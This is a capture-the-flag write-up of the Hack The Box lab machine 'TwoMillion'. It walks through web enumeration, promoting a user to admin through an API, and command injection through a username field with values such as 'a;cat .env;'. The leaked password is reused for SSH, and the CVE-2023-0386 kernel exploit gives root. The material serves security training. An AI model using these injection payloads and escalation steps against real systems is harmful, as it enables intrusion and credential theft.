(Following Guided Mode)

# TwoMillion

## Nmap scan

We have the machine IP.
Through an nmap scan we see the following:
```bash
$ sudo nmap -sV -sC 10.10.11.221
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-02 08:25 EDT
Nmap scan report for 10.10.11.221
Host is up (0.086s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.58 seconds
```

We see 2 open tcp ports.

We will first try to access the website available on the IP.

## Website - Getting an invite code

Using BurpSuite (on the `Target` Tab) we see there is a page `\invite`.\
On the same tab (as well as the `\invite` page source code) we see `inviteapi.min.js`.

```javascript
eval(function(p,a,c,k,e,d){
    ...
    )
```

The code seems to be obfuscated. Using [UnPacker](https://matthewfl.com/unPacker.html) we can de-obfuscate it.

```javascript
function verifyInviteCode(code){
	var formData=
		{
		"code":code
	};
	$.ajax({
		type:"POST",dataType:"json",data:formData,url:'/api/v1/invite/verify',success:function(response){
			console.log(response)
		}
		,error:function(response){
			console.log(response)
		}
	}
	)
}
function makeInviteCode(){
	$.ajax({
		type:"POST",dataType:"json",url:'/api/v1/invite/how/to/generate',success:function(response){
			console.log(response)
		}
		,error:function(response){
			console.log(response)
		}
	}
	)
}
```

The 2nd function `makeInviteCode()` includes a url that's used to generate am invote code.\
It uses a plain `POST` request to said url, and receives a respnse in `JSON`.

We will be using `cURL`.

```bash
$ curl -s http://2million.htb:80/api/v1/invite/how/to/generate -X POST
```

```json
{
    "0":200,
    "success":1,
    "data":{
        "data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr",
        "enctype":"ROT13"
        },
    "hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}
```

We will try to decode the message.\
With a bit of google we find [this](https://stackoverflow.com/questions/5442436/using-rot13-and-tr-command-for-having-an-encrypted-email-address) way to decode `ROT13`:
```bash
$ echo "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate
```

Following this prompt we get the following:
```bash
$ curl -s http://2million.htb:80/api/v1/invite/generate -X POST 
```

```json
{
    "0":200,
    "success":1,
    "data":{
        "code":"UkwxM1ItWVFBNUYtTjNHRE0tSjRNWDI=",
        "format":"encoded"
    }
}
```

By the look of it, it seems to be encoded in Base64.

```bash
$ echo UkwxM1ItWVFBNUYtTjNHRE0tSjRNWDI= | base64 -d
RL13R-YQA5F-N3GDM-J4MX2
```

And now we have our code.

## Join with code

After entering the invite code, we get re-directed to `http://2million.htb/register` where we can create an account.

Looking around the user home, we click on `Access` on the side menu. There, we find a button `Connection Pack`.\
When clicking it, we get redirected to `/api/v1/user/vpn/generate`, which is used to generate an `.ovpn` file for the user.

## API Endpoints

We could try to find more api endpoints.

Using BurpSuite's Repeater, we can edit the request for `/api/v1/user/vpn/generate` to different urls.

`GET /api`:
```json
{
	"\/api\/v1":"Version 1 of the API"
}
```

So `/api` includes `/api/v1`, which we already knew.

`GET /api/v1`:
```json
{
    "v1": {
        "user": {
            "GET": {
                "\/api\/v1": "Route List",
                "\/api\/v1\/invite\/how\/to\/generate": "Instructions on invite code generation",
                "\/api\/v1\/invite\/generate": "Generate invite code",
                "\/api\/v1\/invite\/verify": "Verify invite code",
                "\/api\/v1\/user\/auth": "Check if user is authenticated",
                "\/api\/v1\/user\/vpn\/generate": "Generate a new VPN configuration",
                "\/api\/v1\/user\/vpn\/regenerate": "Regenerate VPN configuration",
                "\/api\/v1\/user\/vpn\/download": "Download OVPN file"
            },
            "POST": {
                "\/api\/v1\/user\/register": "Register a new user",
                "\/api\/v1\/user\/login": "Login with existing user"
            }
        },
        "admin": {
            "GET": {
                "\/api\/v1\/admin\/auth": "Check if user is admin"
            },
            "POST": {
                "\/api\/v1\/admin\/vpn\/generate": "Generate VPN for specific user"
            },
            "PUT": {
                "\/api\/v1\/admin\/settings\/update": "Update user settings"
            }
        }
    }
}
```

From this response we see that appart from `/api/v1/user` there is also `/api/v1/admin` with 3 different urls underneath it.

`GET /api/v1/admin/auth`:
```json
{
	"message":false
}
```

So our user is not an admin.\
Perhaps we can use the POST request to generate an admin VPN.

`POST /api/v1/admin/vpn/generate`:
```
HTTP/1.1 401 Unauthorized
```
No luck.\
We can try the last one too.

`PUT /api/v1/admin/settings/update`:
```json
{
	"status":"danger",
	"message":"Invalid content type."
}
```
No errors!\
We can try some stuff with it.

First of all, we can add `Content-Type: application/json` to our request:
```json
{
	"status":"danger",
	"message":"Missing parameter: email"
}
```

We now need to figure out all the info needed for the PUT request.\
We can try to add `{"email": "<user-email>"}`:
```json
{
	"status":"danger",
	"message":"Missing parameter: is_admin"
}
```

We can try to add `"is_admin": true`:
```json
{
	"status":"danger",
	"message":"Variable is_admin needs to be either 0 or 1."
}
```
We will fix the last variable to `"is_admin": 1`:
```json
{
	"id":15,
	"username":"<username>",
	"is_admin":1
}
```
Looks like a success!

`GET /api/v1/admin/auth`:
```json
{
	"message":true
}
```
Our user is now an admin!\
We can now try again to generate an admin vpn.

`POST /api/v1/admin/vpn/generate`:
```json
{
	"status":"danger",
	"message":"Missing parameter: username"
}
```
We get no errors this time, once again we will try to figure out the needed information.\
We will add `{"username":"a"}`:
```
client
dev tun
proto udp
remote edge-eu-free-1.2million.htb 1337
...
</tls-auth>
```
Success! We have a VPN configuration file.

## Injection to API

Since we get data from this endpoint, we can try to inject the input (username) with malicious code.\
We will change the info on the `POST /api/v1/admin/vpn/generate` to `{"username":"a;whoami;"}`:
```
www-data
```

Using `{"username":"a;ls;"}` and `{"username":"a;ls /;"}` seem to be working as well.

`{"username":"a;ls /home/admin;"}`:
```
CVE-2023-0386
user.txt
```
But we cannot read the `user.txt` file.

We will see what else we can find.

`{"username":"a;ls -a;"}`:
```
.
..
.env
Database.php
Router.php
VPN
assets
controllers
css
fonts
images
index.php
js
views
```

`{"username":"a;cat .env;"}`:
```
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

## Admin server connection

We can try to connect as admin through SSH.
```bash
$ ssh admin@2million.htb    
...
admin@2million.htb's password: 
...

admin@2million:~$ 
```
We have been connected as admin on the server, and can read the flag on `/home/admin/user.txt`.

We will try to see the admin's emails.

```bash
admin@2million:~$ cat /var/mail/admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
admin@2million:~$ 
```

## CVE-2023-0386

```bash
admin@2million:~$ uname -a
Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
admin@2million:~$ cat /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=22.04
DISTRIB_CODENAME=jammy
DISTRIB_DESCRIPTION="Ubuntu 22.04.2 LTS"
admin@2million:~$ 
```

We will try to use this [exploit](https://github.com/xkaneiki/CVE-2023-0386), by downloading it and then uploading it on the server.

```bash
$ sshpass -p SuperDuperPass123 scp CVE-2023-0386.zip admin@2million.htb:/tmp/
```

After unziping it we `cd` in the folder, run `make all` and create a second window with an ssh connection to admin.\
On the first window we run `./fuse ./ovlcap/lower ./gc`.\
On the second window we run `./exp`.

And now we have a root connection, and can get the root flag!
```bash
root@2million:~$ ls root
root.txt  snap  thank_you.json
root@2million:~$ cat root/root.txt
```

# Extra

We will try to read `/root/thank_you.json`.

```bash
root@2million:~$ cat /root/thank_you.json
{"encoding": "url", "data": "%7B%22encoding%22:%20%22hex%22,%20%22data%22:%20%22...7d%22%7D"}
root@2million:~$ 
```

We can take the data between the 2 last `%22` and convert the HEX to ASCII using [rapidtables.com](https://www.rapidtables.com/convert/number/hex-to-ascii.html):
```json
{"encryption": "xor", "encrpytion_key": "HackTheBox", "encoding": "base64", "data": "DAQCG...wgT0M/Ow8AN...0pDA=="}
```

Finaly. we can read our message using [gchq.github.io](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)XOR(%7B'option':'Latin1','string':'HackTheBox'%7D,'Standard',false)).
